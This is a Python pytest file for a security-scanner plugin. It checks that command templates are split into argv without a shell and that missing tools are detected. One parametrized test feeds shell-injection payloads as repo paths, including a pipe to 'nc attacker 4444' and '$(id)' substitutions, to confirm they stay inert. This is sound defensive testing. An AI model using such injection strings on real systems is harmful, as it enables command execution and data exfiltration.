"""Tests for the external-tool plugin: command building and install detection.

Both areas were security-relevant defects. Command templates used to be
substituted and then handed to a shell, and install detection could never
report a tool as missing.
"""

from __future__ import annotations

import pytest

from orchestrator.config import ToolDefinition
from orchestrator.plugins.base import PluginContext
from orchestrator.plugins.live_plugin import LivePlugin, build_argv


def _tool(**overrides) -> ToolDefinition:
    base = dict(
        name="testtool",
        category="sast",
        command="testtool -r {repo_path} -o {output_file}",
        install_check="testtool --version",
    )
    base.update(overrides)
    return ToolDefinition(**base)


# ---------------------------------------------------------------------------
# build_argv – shell metacharacters must not escape
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload", [
    "/tmp/x; touch /tmp/pwned",
    "/tmp/x && id",
    "/tmp/x | nc attacker 4444",
    "/tmp/x$(id)",
    "/tmp/x`id`",
    "/tmp/x\nid",
])
def test_injection_payload_stays_one_argument(payload):
    """A repo path is one argv element regardless of what it contains.

    The template is split before substitution precisely so this holds; the old
    format-then-split order is what made repo_path injectable.
    """
    argv, redirect = build_argv(
        "bandit -r {repo_path} -f json -o {output_file}",
        {"repo_path": payload, "output_file": "/out/b.json"},
    )
    assert argv == ["bandit", "-r", payload, "-f", "json", "-o", "/out/b.json"]
    assert redirect is None


def test_path_with_spaces_is_not_split():
    argv, _ = build_argv(
        "semgrep --sarif -o {output_file} {repo_path}",
        {"repo_path": "/home/My Repo/app", "output_file": "/o/s.json"},
    )
    assert argv[-1] == "/home/My Repo/app"


# ---------------------------------------------------------------------------
# build_argv – redirection, which the shell used to handle
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("template,expected_argv", [
    ("trufflehog filesystem {repo_path} --json > {output_file}",
     ["trufflehog", "filesystem", "/repo", "--json"]),
    ("grype dir:{repo_path} -o json > {output_file}",
     ["grype", "dir:/repo", "-o", "json"]),
])
def test_redirect_is_extracted(template, expected_argv):
    argv, redirect = build_argv(
        template, {"repo_path": "/repo", "output_file": "/out/r.json"}
    )
    assert argv == expected_argv
    assert redirect == "/out/r.json"


def test_redirect_without_space_is_extracted():
    argv, redirect = build_argv("tool >{output_file}", {"output_file": "/out/r.json"})
    assert argv == ["tool"]
    assert redirect == "/out/r.json"


def test_redirect_target_cannot_be_split_by_a_space():
    """A redirect target containing a space stays a single path."""
    _, redirect = build_argv("tool > {output_file}", {"output_file": "/out dir/r.json"})
    assert redirect == "/out dir/r.json"


# ---------------------------------------------------------------------------
# build_argv – malformed templates
# ---------------------------------------------------------------------------

def test_unknown_placeholder_raises_key_error():
    with pytest.raises(KeyError):
        build_argv("tool {nope}", {"repo_path": "/repo"})


@pytest.mark.parametrize("template", ["", "   ", "tool >"])
def test_unusable_template_raises_value_error(template):
    with pytest.raises(ValueError):
        build_argv(template, {})


def test_template_error_is_reported_as_a_failed_artifact(tmp_path):
    """run() must not raise: plugin failures belong in the artifact."""
    plugin = LivePlugin(_tool(command="tool {nope}"))
    artifact = plugin.run(
        PluginContext(repo_path=str(tmp_path), output_dir=str(tmp_path / "out"))
    )
    assert artifact.exit_code != 0


# ---------------------------------------------------------------------------
# is_installed – regression: it could never return False
# ---------------------------------------------------------------------------

def test_missing_tool_is_reported_missing():
    """Regression: a shell exits 127 for a missing binary without raising, so
    the old implementation returned True for every tool and the pipeline
    recorded a clean scan for scanners that never ran."""
    assert LivePlugin(_tool(
        command="definitely-not-a-real-tool -r {repo_path}",
        install_check="definitely-not-a-real-tool --version",
    )).is_installed() is False


def test_present_tool_is_reported_installed():
    assert LivePlugin(_tool(
        command="python3 -c pass", install_check="python3 --version",
    )).is_installed() is True


def test_install_check_may_be_omitted():
    """With no check configured, fall back to the command's own binary."""
    assert LivePlugin(_tool(command="python3 -c pass", install_check="")).is_installed() is True


def test_failing_install_check_does_not_mask_a_present_binary():
    """An installed tool whose --version exits non-zero is still installed;
    running it will surface a real error with a real exit code."""
    assert LivePlugin(_tool(
        command="python3 -c pass", install_check="python3 --definitely-not-a-flag",
    )).is_installed() is True


def test_missing_tool_produces_a_127_artifact(tmp_path):
    """The 'tool not found' branch was unreachable while is_installed was broken."""
    plugin = LivePlugin(_tool(
        command="definitely-not-a-real-tool -r {repo_path}",
        install_check="definitely-not-a-real-tool --version",
    ))
    artifact = plugin.run(
        PluginContext(repo_path=str(tmp_path), output_dir=str(tmp_path / "out"))
    )
    assert artifact.exit_code == 127
    assert "not found" in artifact.stderr


# ---------------------------------------------------------------------------
# End-to-end: the redirect is performed in Python now that there is no shell
# ---------------------------------------------------------------------------

def test_redirected_output_is_written(tmp_path):
    out_dir = tmp_path / "out"
    plugin = LivePlugin(_tool(
        name="printer",
        category="secrets",
        output_format="json",
        command="printf {payload} > {output_file}",
        install_check="printf --version",
    ))
    artifact = plugin.run(PluginContext(
        repo_path=str(tmp_path),
        output_dir=str(out_dir),
        plugin_cfg={"payload": '{"findings": []}'},
    ))

    assert artifact.exit_code == 0
    written = out_dir / "raw" / "printer" / "printer_output.json"
    assert written.read_text() == '{"findings": []}'
